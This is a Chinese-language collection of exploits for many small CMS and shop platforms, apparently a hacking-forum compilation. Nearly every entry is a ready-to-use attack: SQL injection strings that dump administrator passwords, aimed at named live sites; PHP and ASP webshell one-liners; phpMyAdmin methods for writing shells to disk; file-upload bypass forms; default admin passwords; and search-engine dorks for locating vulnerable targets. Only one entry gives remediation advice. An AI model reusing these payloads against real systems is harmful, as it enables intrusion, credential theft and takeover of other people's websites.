@@ -1,0 +1,479 @@
+启航企业建站系统 cookie注入漏洞通杀所有版本
+
+直接上exploit:
+javascript:alert(document.cookie="id="+escape("1 and 1=2 union select 1,username,password,4,5,6,7,8,9,10 from admin"));
+test:http://www.tb11.net/system/xitong/shownews.asp?id=210
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Asprain论坛 注册用户 上传图片就可拿到webshell
+
+Asprain是一个适合于各中小学、中专、技校、职高建设校园论坛、师生交流论坛，一些教科研部门、公司企业建设内部论坛、IT技术爱好者建设技术交流论坛的免费论坛程序。
+1.txt存放你的一句话马 如：<%execute(request("cmd"))%>
+2.gif 为一小图片文件，一定要小，比如qq表情图片
+3:copy /b 2.gif+1.txt 3.gif 这样就伪造了文件头，但是现在传上去还不行，我接下来就用
+4:copy /b 3.gif+2.gif 4.asp ok,现在文件头和文件尾都是正常的图片文件了
+5.q.asp;.gif
+google：Powered by Asprain
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+ShopNum1全部系统存在上传漏洞。
+
+首先 在 http://www.shopnum1.com/product.html 页面查看任意产品详细说明。
+按说明 提示登录后台。。
+在后台功能页面->附件管理->附件列表
+可以直接上传.aspx 后缀木马
+http://demo.shopnum1.com/upload/20110720083822500.aspx
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+牛牛CMS中小企业网站管理系统 上传漏洞
+
+牛牛CMS是中企商铺网专为中小企业网站开发的网站管理系统。
+后台:admin/login.asp
+ewebeditor 5.5 Nday
+exp:
+<form?action="http://www.lz5188.net/Admin/WebEditor168/asp/upload.asp?action=save&type=image&style=popup&cusdir=Mr.DzY.asp"?method=post?name=myform?enctype="multipart/form-data">?
+<input?type=file?name=uploadfile?size=100><br><br>?
+<input?type=submit?value=upload>?
+</form>
+ps:先上传小马.
+inurl:member/Register.asp 您好，欢迎来到立即注册立即登录设为首页加入收藏
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+YothCMS 遍历目录漏洞
+
+优斯科技企业网站管理系统(YothCMS)是一款完全开源免费的CMS。
+默认后台:admin/login.asp
+遍历目录:
+ewebeditor/manage/upload.asp?id=1&dir=../
+data:
+http://www.flycn.net/%23da%23ta%23\%23db_%23data%23%23.asa
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Net112企业建站系统 1.0
+
+源码简介：
+Net112企业建站系统，共有：新闻模块，产品模块，案例模块，下载模块，相册模块，招聘模块，自定义模块，友情链接模块 八大模块。
+添加管理员：
+http://www.0855.tv/admin/admin.asp?action=add&level=2
+其实加不加都不是很重要，后台文件都没怎么作验证。
+上传路径：
+http://www.0855.tv/inc/Upfile.as ... 0&ImgHeight=200
+http://www.0855.tv/inc/Upfile.asp?Stype=2
+怎么利用自己研究。
+遍历目录：
+http://www.0855.tv/admin/upfile.asp?path=../..
+如：
+http://www.0855.tv/admin/upfile.asp?path=../admin
+http://www.0855.tv/admin/upfile.asp?path=../data
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+易和阳光购物商城通杀 上传漏洞
+
+前提要求是IIS6.0+asp坏境。
+漏洞文件Iheeo_upfile.asp 
+过滤不严.直接可以iis6.0上传
+把ASP木马改成0855.asp;1.gif
+直接放到明小子上传
+Google搜索：inurl:product.asp?Iheeoid=
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+phpmyadmin后台4种拿shell方法
+
+方法一：
+CREATE TABLE `mysql`.`xiaoma` (`xiaoma1` TEXT NOT NULL );
+INSERT INTO `mysql`.`xiaoma` (`xiaoma1` )VALUES ('<?php @eval($_POST[xiaoma])?>');
+SELECT xiaomaFROM study INTO OUTFILE 'E:/wamp/www/7.php';
+----以上同时执行，在数据库: mysql 下创建一个表名为：xiaoma，字段为xiaoma1，导出到E:/wamp/www/7.php
+一句话连接密码：xiaoma
+方法二：
+Create TABLE xiaoma (xiaoma1 text NOT NULL);
+Insert INTO xiaoma (xiaoma1) VALUES('<?php eval($_POST[xiaoma])?>');
+select xiaoma1 from xiaoma into outfile 'E:/wamp/www/7.php';
+Drop TABLE IF EXISTS xiaoma;
+方法三：
+读取文件内容：    select load_file('E:/xamp/www/s.php');
+写一句话：select '<?php @eval($_POST[cmd])?>'INTO OUTFILE 'E:/xamp/www/xiaoma.php'
+cmd执行权限：select '<?php echo \'<pre>\';system($_GET[\'cmd\']); echo \'</pre>\'; ?>' INTO OUTFILE 'E:/xamp/www/xiaoma.php'
+方法四：
+select load_file('E:/xamp/www/xiaoma.php');
+select '<?php echo \'<pre>\';system($_GET[\'cmd\']); echo \'</pre>\'; ?>' INTO OUTFILE 'E:/xamp/www/xiaoma.php'
+然后访问网站目录：http://www.xxxx.com/xiaoma.php?cmd=dir
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+传信网络独立开发网站源码0day漏洞
+
+后台system/login.asp
+进了后台有个ewebeditor
+Google 搜索inurl:product1.asp?tyc=
+编辑器漏洞默认后台ubbcode/admin_login.asp
+数据库ubbcode/db/ewebeditor.mdb
+默认账号密码yzm 111111
+
+拿webshell方法
+登陆后台点击“样式管理”-选择新增样式 
+样式名称:scriptkiddies 随便写 
+路径模式：选择绝对路径 
+图片类型：gif|jpg|jpeg|bmpasp|asa|aaspsp|cer|cdx
+图片类型比如就是我们要上传的ASP木马格式
+上传路径：/
+图片限制：写上1000 免的上不了我们的asp木马
+上传内容不要写
+可以提交了 
+样式增加成功！ 
+返回样式管理 找到刚才添加的样式名称 然后按工具栏 在按新增工具栏 
+按钮设置 在可选按钮 选择插入图片然后按》 -然后保存设置
+网页地址栏直接输入ubbcode/Upload.asp?action=save&type=&style=scriptkiddies
+上ASP木马 回车 等到路径
+
+后台：system/login.asp
+Exp:
+and 1=2 union select 1,userid,3,4,5,6,7,8,userpwd,10,11,12,13,14,15 from master
+测试:
+http://www.zjgaoneng.com/product_show.asp?id=9 and 1=2 union select 1,userid,3,4,5,6,7,8,userpwd,10,11,12,13,14,15 from master
+http://www.yaerli.com/product_show.asp?id=245 union select 1,userid,3,4,5,6,7,8,userpwd,10,11,12,13,14 from master
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+foosun 0day 最新注入漏洞
+
+漏洞文件：www.xxx.com/user/SetNextOptions.asp
+利用简单的方法：
+暴管理员帐号：
+http://www.i0day.com/user/SetNex ... amp;ReqSql=select+1,admin_name,3,4,5,6,7,8++from+FS_MF_Admin
+暴管理员密码：
+http://www.i0day.com/user/SetNex ... amp;ReqSql=select+1,admin_pass_word,
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+网站程序的版权未知！
+
+默认网站数据库：
+www.i0day.com/data/nxnews.mdb
+ewebeditor 在线编辑器：
+编辑器数据库下载地址：www.i0day.com/ewebeditor/db/ewebeditor.mdb
+登录地址：ewebeditor/admin_login.asp
+默认密码：admin  admin
+登陆后可遍历目录：ewebedtior/admin_uploadfile.asp?id=22&dir=../../data
+
+Sql注入漏洞：
+http://www.i0day.com/detail.asp?id=12
+exp:
+union select 1,admin,password,4,5,6,7,8 from admin
+爆出明文帐号/密码
+
+上传漏洞：
+后台+upfile.asp
+如：
+http://www.i0day.com/manage/upfile.asp 可以用工具。如明小子。
+shell的地址：网址+后台+成功上传的马
+google:inurl:news.asp?lanmuName=
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+dedecms最新0day利用不进后台直接拿WEBSHELL
+
+拿webshell的方法如下：
+网传的都是说要知道后台才能利用，但不用，只要 plus 目录存在，服务器能外连，就能拿shell.
+前题条件，必须准备好自己的dede数据库，然后插入数据：
+insert into dede_mytag(aid,normbody) values(1,'{dede:php}$fp = @fopen("1.php", \'a\');@fwrite($fp, \'\');echo "OK";@fclose($fp);{/dede:php}'); 
+
+再用下面表单提交，shell 就在同目录下 1.php。原理自己研究。。。
+<form action="" method="post" name="QuickSearch" id="QuickSearch" onsubmit="addaction();">
+<input type="text" value="http://www.tmdsb.com/plus/mytag_js.php?aid=1" name="doaction" style="width:400"><br />
+<input type="text" value="dbhost" name="_COOKIE[GLOBALS][cfg_dbhost]" style="width:400"><br />
+<input type="text" value="dbuser" name="_COOKIE[GLOBALS][cfg_dbuser]" style="width:400"><br />
+<input type="text" value="dbpwd" name="_COOKIE[GLOBALS][cfg_dbpwd]" style="width:400"><br />
+<input type="text" value="dbname" name="_COOKIE[GLOBALS][cfg_dbname]" style="width:400"><br />
+<input type="text" value="dede_" name="_COOKIE[GLOBALS][cfg_dbprefix]" style="width:400"><br />
+<input type="text" value="true" name="nocache" style="width:400">
+<input type="submit" value="提交" name="QuickSearchBtn"><br />
+</form>
+<script>
+function addaction()
+{
+document.QuickSearch.action=document.QuickSearch.doaction.value;
+}
+</script>
+-----------------------------------------------------------------------------------------------------------------------------------------------
+
+dedecms织梦暴最新严重0day漏洞
+bug被利用步骤如下：
+http://www.2cto.com /网站后台/login.php?dopost=login&validate={dcug}&userid=admin&pwd=inimda&_POST[GLOBALS][cfg_dbhost]=116.255.183.90&_POST[GLOBALS][cfg_dbuser]=root&_POST[GLOBALS][cfg_dbpwd]=r0t0&_POST[GLOBALS][cfg_dbname]=root
+把上面{}上的字母改为当前的验证码，即可直接进入网站后台。
+-------------------------------------------------------------------------------------------------------------------------------------------
+
+多多淘宝客程序上传漏洞 
+漏洞页面：
+admin\upload_pic.php
+传送门：
+http://www.www.com/admin/upload_pic.php?uploadtext=slide1
+PS:copy张图片马 直接  xxx.php 上传抓包地址！
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+无忧公司系统ASP专业版后台上传漏洞
+漏洞文件 后台上传
+admin/uploadPic.asp
+漏洞利用 这个漏洞好像是雷池的
+http://forum.huc08.com/admin/upl ... ptkiddies.asp;& upload_code=ok&editImageNum=1
+等到的webshell路径：
+/UploadFiles/scriptkiddies.asp;_2.gif
+---------------------------------------------------------------------------------------------------------------------------------------------------
+
+住哪酒店分销联盟系统2010
+Search：
+inurl:index.php?m=hotelinfo
+http://forum.huc08.com /index.php?m=liansuohotel&cityid=53%20and%201=2%20union%20select%201,concat(username,0x3a,password),3,4,5,6,7,8,9,10%20from%20zhuna_admin
+默认后台：index.php?m=admin/login
+--------------------------------------------------------------------------------------------------------------------------------------------------
+
+inurl:info_Print.asp?ArticleID=
+后台 ad_login.asp
+爆管理员密码：
+union select 1,2,username,password,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 from admin
+------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+搜索框漏洞！
+%' and 1=2 union select 1,admin,3,4,5,6,password,8,9,10 from admin where '%'='
+--------------------------------------------------------------------------------------------------------------------------------------------------------
+
+关键字：
+inurl:/reg_TemletSel.asp?step=2
+或者
+电子商务自助建站--您理想的助手
+-------------------------------------------------------------------------------------------------------------------------------------------------
+
+iGiveTest 2.1.0注入漏洞
+Version: <= 2.1.0
+# Homepage: http://iGiveTest.com/
+谷歌关键字: “Powered by iGiveTest”
+随便注册一个帐号。然后暴管理员帐号和密码
+http://www.xxxx.com/users.php?ac ... r=-1&userids=-1) union select 1,concat(user_name,0x3a,user_passhash),user_email,user_firstname,user_lastname,6,7 from users,groups where (1
+------------------------------------------------------------------------------------------------------------------------------------------------
+
+CKXP网上书店注入漏洞
+工具加表:shop_admin 加字段:admin
+后台:admin/login.asp 
+登陆后访问:admin/editfile.asp?act= 直接写马.也可以直接传马:admin/upfile1.asp?path=/
+inurl:book.asp 请使用域名访问本站并不代表我们赞同或者支持读者的观点。我们的立场仅限于传播更多读者感兴趣的信息
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+段富超个人网站系统留言本写马漏洞
+源码下载：http://www.mycodes.net/24/2149.htm
+addgbook.asp 提交一句话。
+连接： http://www.xxxx.tv/date/date3f.asp
+google:为防批量，特略！
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+智有道专业旅游系统v1.0 注入及列目录漏洞
+默认后台路径：/admin/login.asp
+默认管理员：admin
+默认密码：123456
+SQL EXP Tset:
+http://www.untnt.com/info/show.asp?id=90 union select 1,userid,3,4,5,userpsw,7,8,9,10,11,12,13,14,15 from admin
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+ewebeditor(PHP) Ver 3.8 本任意文件上传0day
+EXP：
+<title>eWebeditoR3.8 for php任意文件上EXP</title>
+<form action="" method=post enctype="multip
+art/form-data"> 
+<INPUT TYPE="hidden" name="MAX_FILE_SIZE" value="512000"> 
+URL:<input type=text name=url value="http://www.untnt.com/ewebeditor/" size=100><br> 
+<INPUT TYPE="hidden" name="aStyle[12]" value="toby57|||gray|||red|||../uploadfile/|||550|||350|||php|||swf|||gif|jpg|jpeg|bmp|||rm|mp3|wav|mid|midi|ra|avi|mpg|mpeg|asf|asx|wma|mov|||gif|jpg|jpeg|bmp|||500|||100|||100|||100|||100|||1|||1|||EDIT|||1|||0|||0|||||||||1|||0|||Office|||1|||zh-cn|||0|||500|||300|||0|||...|||FF0000|||12|||宋体||||||0|||jpg|jpeg|||300|||FFFFFF|||1"> 
+file:<input type=file name="uploadfile"><br> 
+<input type=button value=submit onclick=fsubmit()> 
+</form><br> 
+<script> 
+function fsubmit(){ 
+form = document.forms[0]; 
+form.action = form.url.value+''php/upload.php?action=save&type=FILE&style=toby57&language=en''; 
+alert(form.action); 
+form.submit(); 
+} 
+</script>
+注意修改里面ewebeditor的名称还有路径。
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+提交’时提示ip被记录 防注入系统的利用
+网址：http://www.xxx.com/newslist.asp?id=122′
+提示“你的操作已被记录!”等信息。
+利用方法：www.xxx.com/sqlin.asp看是否存在，存在提交http://www.xxx.com/newslist.asp?id=122‘excute(request("TNT"))写入一句话。
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+西部商务网站管理系统 批量拿shell-0day
+这站用的是SQL通用防注入程序 V3.0,恩,这东西可不好绕,我记得当初我有写过一个文章 通过提交一句话直接拿shell的..唯一的前提是存储记录ip的数据库必须是.asp或.asa才行..看了下sqlin.mdb 
+1:admin_upset.asp 这个文件有个设置上传后缀的地方.. 很简单,它直接禁止了asp,asa.aspx 还有个cer可以利用嘛
+2:同样是admin_upset.asp 这个文件不是入库的 他是直接在htmleditor目录生成个config.asp文件...Ok不用多说,插个一句话搞定...注意闭合
+3:admin_bakup.asp 备份数据库的..但是得本地构造...调用了filesystemobject 怎么利用就不强调了..IIS的bug大家都懂
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+JspRun!6.0 论坛管理后台注入漏洞
+
+SEBUG-ID:20787 发布时间:2011-04-30 影响版本:
+JspRun!6.0 
+漏洞描述:
+JspRun!论坛管理后台的export变量没有过滤，直接进入查询语句，导致进行后台，可以操作数据库，获取系统权限。
+在处理后台提交的文件中ForumManageAction.java第1940行
+String export = request.getParameter("export");//直接获取，没有安全过滤
+if(export!=null){
+List&gt; styles=dataBaseService.executeQuery("SELECT s.name, s.templateid, t.name AS tplname, t.directory, t.copyright FROM jrun_styles s LEFT JOIN jrun_templates t ON t.templateid=s.templateid WHERE styleid='"+export+"'");//进入查询语，执行了...
+if(styles==null||styles.size()==0){
+<*参考
+nuanfan@gmail.com
+*> SEBUG安全建议:
+www.jsprun.net
+（1）安全过滤变量export
+（2）在查询语句中使用占位符
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+乌邦图企业网站系统 cookies 注入
+
+程序完整登陆后台:/admin/login.asp
+默认登陆帐号:admin 密码:admin888
+语句：(前面加个空格)
+and 1=2 union select 1,username,password,4,5,6,7,8,9,10 from admin
+或者是16个字段：
+and 1=2 union select 1,username,password,4,5,6,7,8,9,10,11,12,13,14,15,16 from admin
+爆不出来自己猜字段。
+注入点：http://www.untnt.com/shownews.asp?=88
+getshell:后台有备份，上传图片小马。备份名：a.asp 访问 xxx.com/databakup/a.asp
+关键字：
+inurl:shownews?asp.id=
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+CKXP网上书店注入漏洞
+
+工具加表:shop_admin 加字段:admin
+后台:admin/login.asp 
+登陆后访问:admin/editfile.asp?act= 直接写马.也可以直接传马:admin/upfile1.asp?path=/
+inurl:book.asp 请使用域名访问本站并不代表我们赞同或者支持读者的观点。我们的立场仅限于传播更多读者感兴趣的信息
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+YxShop易想购物商城4.7.1版本任意文件上传漏洞
+
+http://xxoo.com/controls/fckedit ... aspx/connector.aspx
+跳转到网站根目录上传任意文件。
+如果connector.aspx文件被删可用以下exp，copy以下代码另存为html，上传任意文件
+<form id="frmUpload" enctype="multipart/form-data" action="http://www.xxoo.net/controls/fckeditor/editor/filemanager/upload/aspx/upload.aspx?Type=Media" method="post">
+Upload a new file:<br>
+<input type="file" name="NewFile" size="50"><br>
+<input id="btnUpload" type="submit" value="Upload">
+</form>
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+SDcms 后台拿webshell
+
+第一种方法：
+进入后台-->系统管理-->系统设置-->系统设置->网站名称;
+把网站名称内容修改为   "%><%eval request("xxx")'    //密码为xxx
+用菜刀链接http://www.xxx.com/inc/const.asp  就搞定了。
+第二种方法：
+进入后台-->系统管理-->系统设置-->系统设置->上传设置;
+在文件类型里面添加一个aaspsp的文件类型，然后找一个上传的地方直接上传asp文件！ 注：修改文件类型后不能重复点保存！
+第三种方法：
+进入后台-->界面管理-->模板文件管理-->创建文件
+文件名写入getshell.ashx
+内容写入下面内容：
+/====================复制下面的=========================/
+<%@ WebHandler Language="C#" Class="Handler" %>
+using System;
+using System.Web;
+using System.IO;
+public class Handler : IHttpHandler {
+public void ProcessRequest (HttpContext context) {
+context.Response.ContentType = "text/plain";
+StreamWriter file1= File.CreateText(context.Server.MapPath("getshell.asp"));
+file1.Write("<%response.clear:execute request(\"xxx\"):response.End%>");
+file1.Flush();
+file1.Close();
+}
+public bool IsReusable {
+get {
+return false;
+}
+}
+}
+/=============================================/
+访问这个地址：http://www.xxx.com/skins/2009/getshell.ashx
+会在http://www.xxx.com/skins/2009/目录下生成getshell.asp 一句话木马 密码为xxx 用菜刀链接
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+ESCMS网站管理系统0day
+
+后台登陆验证是通过admin/check.asp实现的
+
+首先我们打开http://target.com/admin/es_index.html
+然后在COOKIE结尾加上
+; ESCMS$_SP2=ES_admin=st0p;
+修改,然后刷新
+进后台了嘎..
+然后呢…提权,嘿嘿,admin/up2.asp,上传目录参数filepath过滤不严,导致可截断目录,生成SHELL
+
+利用方法,可以抓包,然后改一下,NC上传,还可以直接用DOMAIN等工具提交.
+嘿嘿,成功了,shell地址为http://target.com/admin/diy.asp
+存在这个上传问题的还有admin/downup.asp,不过好像作者的疏忽,没有引用inc/ESCMS_Config.asp,导致打开此页面失败..
+在版本ESCMS V1.0 正式版中,同样存在上传问题admin/up2.asp和admin/downup.asp都可利用,只不过cookies欺骗不能用了
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+宁志网站管理系统后台无验证漏洞及修复
+
+网上搜了一下,好像没有发布.如有雷同纯粹巧合!
+官方网站:www.ningzhi.net
+学校网站管理系统 V.2011版本 
+http://down.chinaz.com/soft/29943.htm 
+其它版本(如:政府版等),自行下载.
+漏洞说明:后台所有文件竟然都没有作访问验证...相当无语...竟然用的人还很多.汗~~~
+login.asp代码如下:
+<%  response.Write"<script language=javascript>alert('登陆成功！请谨慎操作！谢谢！');this.location.href='manage.asp';</script>" %> 
+manage.asp代码我就不帖出来了.反正也没验证.
+只要访问登陆页就可以成功登陆.....蛋疼~~~ 对此本人表示不理解!
+漏洞利用:
+直接访问http://www.0855.tv/admin/manage.asp
+数据库操作:http://www.0855.tv/admin/manage_web.asp?txt=5&id=web5
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+phpmyadmin拿shell的四种方法总结及修复
+
+方法一：
+CREATE TABLE `mysql`.`study` (`7on` TEXT NOT NULL );
+INSERT INTO `mysql`.`study` (`7on` )VALUES ('<?php @eval($_POST[7on])?>');
+SELECT 7onFROM study INTO OUTFILE 'E:/wamp/www/7.php';
+----以上同时执行，在数据库: mysql 下创建一个表名为：study，字段为7on，导出到E:/wamp/www/7.php
+    一句话连接密码：7on
+方法二：
+读取文件内容：    select load_file('E:/xamp/www/s.php');
+写一句话：    select '<?php @eval($_POST[cmd])?>'INTO OUTFILE 'E:/xamp/www/study.php'
+cmd执行权限：    select '<?php echo \'<pre>\';system($_GET[\'cmd\']); echo \'</pre>\'; ?>' INTO OUTFILE 'E:/xamp/www/study.php'
+方法三：
+JhackJ版本 PHPmyadmin拿shell
+Create TABLE study (cmd text NOT NULL);
+Insert INTO study (cmd) VALUES('<?php eval($_POST[cmd])?>');
+select cmd from study into outfile 'E:/wamp/www/7.php';
+Drop TABLE IF EXISTS study;
+<?php eval($_POST[cmd])?>
+CREATE TABLE study(cmd text NOT NULL );# MySQL 返回的查询结果为空(即零行)。
+INSERT INTO study( cmd ) VALUES ('<?php eval($_POST[cmd])?>');# 影响列数： 1
+SELECT cmdFROM study INTO OUTFILE 'E:/wamp/www/7.php';# 影响列数： 1
+DROP TABLE IF EXISTS study;# MySQL 返回的查询结果为空(即零行)。
+方法四：
+select load_file('E:/xamp/www/study.php');
+select '<?php echo \'<pre>\';system($_GET[\'cmd\']); echo \'</pre>\'; ?>' INTO OUTFILE 'E:/xamp/www/study.php'
+然后访问网站目录：http://www.2cto.com/study.php?cmd=dir
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+NO.001中学网站管理系统 Build 110628 注入漏洞
+
+NO.001中学网站管理系统功能模块:
+1.管理员资料:网站的基本信息设置（校长邮箱等）,数据库备份,用户管理、部门及权限管理等
+2.学校简介:一级分类，可以添加校园简介,领导致辞、校园风光、联系我们。。。等信息
+3.文章管理:二级分类,动态添加各相关频道（图片视频频道、学校概况频道除外）文章等信息
+4.视频图片管理:一级分类,动态添加视频或者图片等信息
+5.留言管理:对留言,修改,删除、回复等管理
+6.校友频道:包括校友资料excel导出、管理等功能
+7.友情链接管理:二级分类，能建立不同种类的友情链接显示在首页
+默认后台:admin/login.asp
+官方演示:http://demo.001cms.net
+源码下载地址:http://down.chinaz.com/soft/30187.htm
+EXP:
+union select 1,2,3,a_name,5,6,a_pass,8,9,10,11 from admin
+测试:http://demo.001cms.net/shownews.asp?type=新闻动态&stype=校务公开&id=484 union select 1,2,3,a_name,5,6,a_pass,8,9,10,11 from admin
+getshell:后台有备份，你懂的
+另:FCK编辑器有几处可利用.大家自己行挖掘,由于相关内容较多，我在这里就不说了。
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
